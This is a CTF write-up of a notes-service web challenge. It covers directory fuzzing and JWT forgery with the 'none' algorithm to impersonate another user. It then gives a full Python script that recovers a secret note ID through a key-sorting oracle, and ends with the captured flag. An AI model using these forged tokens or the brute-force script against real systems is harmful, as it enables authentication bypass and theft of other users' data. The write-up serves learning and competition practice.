## Web Challenge

While I was stuck with some technical issues on Mobile 4, I decided it would be best to take a break and finish the web challenge rather quickly. Overall this is a more accessible challenge, which has more of a game feel rather than a very difficult technical problem.

The challenge is setup in a web server, located at `http://159.203.178.9/`. When visited, the page will respond with the following image:

![](/home/user/work/shared/flags/HTS-702-2018-CTF/web-challenge/hello.png) 

It gives us a few hints, but the main takeaway is that there is a service within this server that allows for the storage of notes. We can look at the response headers to see if there is any more information in there:

```
HTTP/1.1 200 OK
Date: Wed, 27 Jun 2018 23:24:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 13 Jun 2018 23:59:52 GMT
ETag: "255-56e8ec75a6ed1-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 597
Connection: close
Content-Type: text/html
```

Nothing major. The server says it is a relatively old version of apache, which is affected by some vulnerabilities but nothing that screams to me as being the solution to the challenge. For the sake of being thorough, I run an nmap scan of the host and identify that there are a total of two open ports, 80 and 22. Port 22 frequently shows up in games like these with weak passwords, but in this case it is configured to only accept [Key-Based authentication](https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server).

With that in mind, I think the next logical step is to try to guess the location of the note service. Because apache2 is in use, I think it will most likely be a `.php` file, but there could also be some interesting `.html` files as well. For this writeup, I am going to use wfuzz, which can be installed as [described here](https://github.com/xmendez/wfuzz/blob/master/docs/user/installation.rst). I will also require a wordlist, so I am going to use one from fuzzdb. I know there are several things that can be improved on the example below but for the purpose of finding the files quickly it works OK.

```
$ wget https://raw.githubusercontent.com/golismero/golismero/master/wordlist/fuzzdb/Discovery/FilenameBruteforce/WordlistSkipfish.fuzz.txt -O wordlist.txt
$ wfuzz --hc 404 -z file,wordlist.txt http://159.203.178.9/FUZZ.php
[...]
001412:  C=415      0 L        2 W           24 Ch        "rpc"
[...]
$ wfuzz --hc 404 -z file,wordlist.txt http://159.203.178.9/FUZZ.html
[...]
000861:  C=200     26 L       81 W          597 Ch        "index"
000101:  C=200    487 L      943 W        10977 Ch        "README"
[...]
```
We have found three files: `rpc.php` which responds with a `415` and `index.html` and `README.html` which respond with a `200`. Looking at the readme file we can observe some documentation!

![](/home/user/work/shared/flags/HTS-702-2018-CTF/web-challenge/documentation.png) 

The documentation is very verbose, but reading through it we can get several key important points:

* Authentication is done with what is described as JWT, standing for JSON Web Tokens.
* There is a version header, which is required, but only one version exists so far.
* Notes are referred to by their unique key. Once a Key is destroyed, there is no way of accessing the note anymore.
* There are four endpoints: to read a note by key, create notes, get notes metadata and "reset".

Let's make, for example, a call to `getNotesMetadata`, and observe the response:

```
GET /rpc.php?method=getNotesMetadata HTTP/1.1
Host: 159.203.178.9
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Mn0.t4M7We66pxjMgRNGg1RvOmWT6rLtA8ZwJeNP-S8pVak
Accept: application/notes.api.v1+json

HTTP/1.1 200 OK
Date: Wed, 27 Jun 2018 23:45:42 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 23
Content-Type: application/json

{"count":0,"epochs":[]}
```

We can see there are no notes for the current account by default. This means that whoever we are authenticated as, does not own the note where the flag is hidden. That authorisation header must somehow contain our user account. Now, JWT are a standard method of authentication. We can, for example, take that token and paste it on a webpage online that could decode the values, or we can do so manually. The format for JWT is roughly:

```
first_part.second_part.third_part
```

That is, three base64-URL encoded strings separated by a dot. The first part contains information pertaining to how the token is signed, and the second part contains authentication information. Let's have a look at the first two parts in the token shown in the documentation:

```
{"typ":"JWT","alg":"HS256"}
{"id":2}
```

There are several common attacks against JWT, the simplest of all being the removal of the signature component by using the `none` signing algorithm. Let's change the first part of the JWT to `{"typ":"JWT","alg":"none"}` and see if it works:

```
GET /rpc.php?method=getNotesMetadata HTTP/1.1
Host: 159.203.178.9
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6Mn0.t4M7We66pxjMgRNGg1RvOmWT6rLtA8ZwJeNP-S8pVak
Accept: application/notes.api.v1+json

HTTP/1.1 200 OK
Date: Wed, 27 Jun 2018 23:52:03 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 23
Content-Type: application/json

{"count":0,"epochs":[]}
```

OK, that worked. If you have any issues when decoding or encoding the base64, append a few equal signs before decoding and remove them when encoding. This happens because JWT does not use regular base64 but rather a similar encoding which disposes of equal signs at the end.

Now we can change the second part of the JWT so that it refers to another user's ID. Because we're user number two I am going to make a gamble and assume user `1` is who we are after:

```
GET /rpc.php?method=getNotesMetadata HTTP/1.1
Host: 159.203.178.9
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MX0.t4M7We66pxjMgRNGg1RvOmWT6rLtA8ZwJeNP-S8pVak
Accept: application/notes.api.v1+json

HTTP/1.1 200 OK
Date: Wed, 27 Jun 2018 23:56:09 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 35
Content-Type: application/json

{"count":1,"epochs":["1528911533"]}
```

Ah ha! There's the note. But there's a problem :( looking around I could not find any instance where the application disclosed the note ids, that are necessary for retrieving the note. Because there are references to the note creation time all over the place and note ids are generated "randomly", I assumed that maybe there was a way to infer the randomly created string from its creation time through some technique, but everything was pointless.

The application was too secure. Thinking back, and reading the documentation again for a hundredth time, I decided to go back to hacking 101 and look at the source code for the documentation's HTML. In the HTML source I found the following gem:

```
      The service is being optimized continuously. A version number can be provided in the <code>Accept</code>
      header of the request. At this time, only <code>application/notes.api.v1+json</code> is supported.
      <!--
        Version 2 is in the making and being tested right now, it includes an optimized file format that
        sorts the notes based on their unique key before saving them. This allows them to be queried faster.
        Please do NOT use this in production yet!
      -->
```

And there is the truth. Version two *is* enabled and one of the differences is that notes are now sorted by key. This is problematic because since we can specify our own key ids in the `createNote` endpoint, we can try character per character, seeing if the newly input character is after the key's first character. Let's try it.

Remember from before, the epoch we're after is `1528911533`. Using the version two of the API and assuming that the app will sort the keys as strings, I input a "low" value which is likely to be before, such as `0`:

![](/home/user/work/shared/flags/HTS-702-2018-CTF/web-challenge/before.png) 

I now will input a letter that I consider to be high. Sorting like strings, generally lowercase `z` is the "higher" value. We can confirm this works:

![](/home/user/work/shared/flags/HTS-702-2018-CTF/web-challenge/Screenshot_2018-06-28_11-16-23.png) 

I've made mentions of "high" and "low" values. As I mentioned on the mobile writeups, all characters in the ascii space have a number, which can be looked up in an ascii table. Digits from 0 to 9 have a value that is lower than uppercase letters, and uppercase letters have a lower value than lowercase letters. 

![](/home/user/work/shared/flags/HTS-702-2018-CTF/web-challenge/imgs/20180628-121127.png) 

That being said, the this logic fails on the first character, I assume due to some crazy PHP type juggling issue, where PHP deems numbers to be always higher than strings, or something like that. With that in mind, the python code to solve the challenge looks as follows:

```
import requests                                                                                          
import sys                                                                                               
import string                                                                                            
                                                                                                         
TARGET_EPOCH = "1528911533"                                                                              
def create_note(id):                                                                                     
    id = str(id)                                                                                         
    burp0_url = "http://159.203.178.9:80/rpc.php?method=createNote&id=1528911533"                        
    burp0_headers = {"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MX0.", "Accept": "application/notes.api.v2+json", "Connection": "close", "Content-type": "application/json"}                   
    burp0_json={"id": id, "note": "aa"}                                                                  
    requests.post(burp0_url, headers=burp0_headers, json=burp0_json)                                     
                                                                                                         
def reset():                                                                                             
    burp0_url = "http://159.203.178.9:80/rpc.php?method=resetNotes"                                      
    burp0_headers = {"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MX0.", "Accept": "application/notes.api.v2+json", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}      requests.post(burp0_url, headers=burp0_headers)                                                      
                                                                                                         
def get_meta():                                                                                          
    burp0_url = "http://159.203.178.9:80/rpc.php?method=getNotesMetadata"                                
    burp0_headers = {"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MX0.", "Accept": "application/notes.api.v2+json", "Connection": "close"}                                                           resp = requests.get(burp0_url, headers=burp0_headers)                                                
                                                                                                         
    return resp.content                                                                                  
                                                                                                         
# we need to split strings because JSON parsing may alter the ordering.                                  
def is_attempt_before(result):                                                                           
    splat = result.split('[')[1].split(",")                                                              
    if len(splat) != 2:                                                                                  
        print result                                                                                     
        raise Exception("Bad len")                                                                       
    first = splat[0][1:-1]                                                                               
    last = splat[1][1:-3]                                                                                
                                                                                                         
    return first != TARGET_EPOCH                                                                         
                                                                                                         
def out_val(out):                                                                                        
    final_out = []                                                                                       
    for pos in range(16):                                                                                
        try:                                                                                             
            val = out[pos]                                                                               
            final_out.append(val)                                                                        
        except IndexError:                                                                               
            final_out.append(chr(0))                                                                     
                                                                                                         
    return ''.join(final_out).encode('hex').upper()                                                      
                                                                                                         
                                                                                                         
out = ""                                                                                                 
for pos in range(32):                                                                                    
    # Crazy things happen when the first character is a digit.                                           
    if pos == 0:                                                                                         
       pos_digits = string.ascii_uppercase + string.ascii_lowercase                                      
    else:                                                                                                
       pos_digits = string.digits + string.ascii_uppercase + string.ascii_lowercase                      
       print "So far %s" % ("".join(out))                                                                
                                                                                                         
    for digit in pos_digits:                                                                             
       reset()                                                                                           
       attempt = out + digit                                                                             
       create_note(attempt)                                                                              
       result = get_meta()                                                                               
                                                                                                         
       if not is_attempt_before(result):                                                                 
           # attempt is after                                                                            
           out += prev_char                                                                              
           break                                                                                         
       else:                                                                                             
           prev_char = digit                             
           
print "Final out " + out                                                
```

Output looks as follows:

```
So far E
So far Ee
So far Eel
So far EelH
[...]
```

In the end, we find out that the note id is `EelHIXsuAw4FXCa9epee` and we can retrieve the note:

```
GET /rpc.php?method=getNote&id=EelHIXsuAw4FXCa9epee HTTP/1.1
Host: 159.203.178.9
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MX0.
Accept: application/notes.api.v2+json
Connection: close

HTTP/1.1 200 OK
Date: Thu, 28 Jun 2018 00:23:49 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 80
Connection: close
Content-Type: application/json

{"note":"NzAyLUNURi1GTEFHOiBOUDI2bkRPSTZINUFTZW1BT1c2Zw==","epoch":"1528911533"}
```

The note is base64 encoded and it decodes to: `702-CTF-FLAG: NP26nDOI6H5ASemAOW6g`. We can now paste that into the thing and get the green tick:

![](/home/user/work/shared/flags/HTS-702-2018-CTF/web-challenge/done2.png) 